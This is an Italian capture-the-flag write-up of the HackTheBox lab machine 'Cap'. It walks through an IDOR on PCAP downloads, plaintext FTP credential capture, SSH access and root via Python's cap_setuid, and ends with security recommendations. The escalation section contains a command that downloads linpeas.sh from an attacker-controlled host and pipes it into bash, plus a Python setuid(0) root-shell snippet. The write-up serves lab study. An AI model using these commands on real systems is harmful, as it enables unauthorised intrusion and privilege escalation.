### **Write-up HTB Machine "Cap"**

#### **1. Panoramica della Macchina**
- **Difficoltà**: Facile (Linux)
- **Servizi Principali**: HTTP (Network Capture Tool), FTP, SSH
- **Vulnerabilità Chiave**: IDOR → Credenziali in chiaro → Escalation privilegi via capability `CAP_SETUID`

#### **2. Riepilogo dell'Attacco**
1. **Enumeration**: Scansione con Nmap rivela porte aperte (21/FTP, 22/SSH, 80/HTTP).
2. **IDOR Exploit**: Manipolazione parametro ID per scaricare PCAP non autorizzati.
3. **Analisi PCAP**: Identificazione credenziali FTP/SSH in chiaro.
4. **Foothold**: Accesso SSH con credenziali rubate.
5. **Privilege Escalation**: Sfruttamento della capability `CAP_SETUID` assegnata a Python.

---

#### **3. Vulnerabilità IDOR: Dettagli Tecnici**
**Definizione**:  
L'Insecure Direct Object Reference (IDOR) permette a un utente di accedere a risorse non autorizzate manipolando identificatori (es: numeri progressivi).

**Esempio Pratico**:  
```
http://10.10.10.56/data/[ID]
```
Modificando `[ID]` (es: da 2 a 1 o 3), è possibile scaricare PCAP appartenenti ad altri utenti.

**Impatto**:  
- Esposizione credenziali FTP: `utente:password`
- Accesso a dati sensibili di rete

**Prevenzione**:  
- Validazione autorizzazioni lato server
- Utilizzo di UUID non sequenziali
- Crittografia del traffico (es: SFTP invece di FTP)

---

#### **4. Walkthrough dell'Exploit**

**Step 1: Scansione Iniziale**  
```bash
nmap -sV -Pn 10.10.10.56
```
**Risultati**:  
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    gunicorn
```

**Step 2: Scoperta IDOR**  
1. Visitare `http://10.10.10.56/data/2`
2. Modificare manualmente l'ID nell'URL:
   ```
   http://10.10.10.56/data/1 → PCAP di un altro utente
   ```

**Step 3: Analisi PCAP con Wireshark**  
- Filtro FTP: `ftp.request.command == "PASS"`
- Credenziali esposte:  
  ```
  USER: utente
  PASS: password123!
  ```

**Step 4: Accesso SSH**  
```bash
ssh utente@10.10.10.56
```

---

#### **5. Privilege Escalation (CAP_SETUID)**
**Identificazione della Vulnerability**:  
```bash
# Creazione di un server HTTP che serve il contenuto della directory corrente sulla macchina attaccante
# dove ho scaricato linpeas.sh
python -m http.server 80

# Esecuzione linPEAS
curl http://<IP_ATTACCANTE>/linpeas.sh | bash
```
**Finding Critico**:  
```
╔══════════╣ Capabilities
/usr/bin/python3.8 = cap_setuid+ep
```

**Exploit con Python**:  
```python
import os
os.setuid(0)  # Imposta UID a root (0)
os.system("/bin/bash")
```
**Risultato**:  
```
root@cap:/home/utente# id
uid=0(root) gid=1000(utente)
```

---

#### **6. Raccomandazioni di Sicurezza**
1. **FTP**: Sostituire con SFTP/FTPS
2. **IDOR**: Implementare controlli di autorizzazione
3. **Capabilities**: Rimuovere `CAP_SETUID` da Python
